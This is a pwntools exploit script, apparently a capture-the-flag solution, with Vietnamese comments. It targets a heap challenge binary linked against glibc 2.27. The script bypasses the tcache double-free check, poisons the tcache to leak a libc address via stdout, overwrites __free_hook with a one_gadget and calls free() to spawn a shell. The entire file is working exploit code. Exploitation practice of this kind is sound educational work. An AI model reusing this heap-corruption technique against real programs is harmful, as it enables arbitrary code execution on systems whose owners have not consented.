#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_poison_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
gdb.attach(p,gdbscript=
           '''
           b*0x00000000004007d5
           b*0x0000000000400830 
           b*0x000000000040083d
           b*0x000000000040086b
           b*0x0000000000400879
           b*0x0000000000400893
           b*0x00000000004008bf
           ''')

def allocate(size,content):
    p.sendlineafter(b'Edit\n',b'1')
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Content: ',content)

def free():
    p.sendlineafter(b'Edit\n',b'2')

def printf_():
    p.sendlineafter(b'Edit\n',b'3')

def edit_chunk(contentt):
    p.sendlineafter(b'Edit\n',b'4')
    p.sendafter(b'Edit chunk: ',contentt)

#input()

#chunk 0x40
allocate(0x30,"phuocloi")
#free lan 1
free()

#edit de bypass check dbf
edit_chunk("a"*8 + "\x00")
#bypass thanh cong
free()


#luc nay trong bins se co 2 thang con tro y chang nhau
addr_stdout = exe.sym.stdout
#input()

#thay doi fw 
allocate(0x30,p64(addr_stdout))

#thang nay de lay th dau tien ra
allocate(0x30,"b"*8)

#thang nay la stdout cua ta 
allocate(0x30,'\x60')
#leak dc libc
printf_()


input()
p.recvuntil("Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
one_gadget = [0x4f3ce,0x4f3d5,0x4f432,0x10a41c]

one_gadget_read = libc_base + one_gadget[2]
print("one_gadget: ",hex(one_gadget_read))
print("libc_base: ",hex(libc_base))
print("free_hook: ",hex(free_hook))

#Overwrite the `__free_hook` with the address of one_gadget
allocate(0x40, "dreamhack")
free()
edit_chunk("C"*8 + "\x00")
free()
allocate(0x40, p64(free_hook))
allocate(0x40, "D"*8)
allocate(0x40, p64(one_gadget_read))

# Call `free()` to get shell
free()
p.interactive()
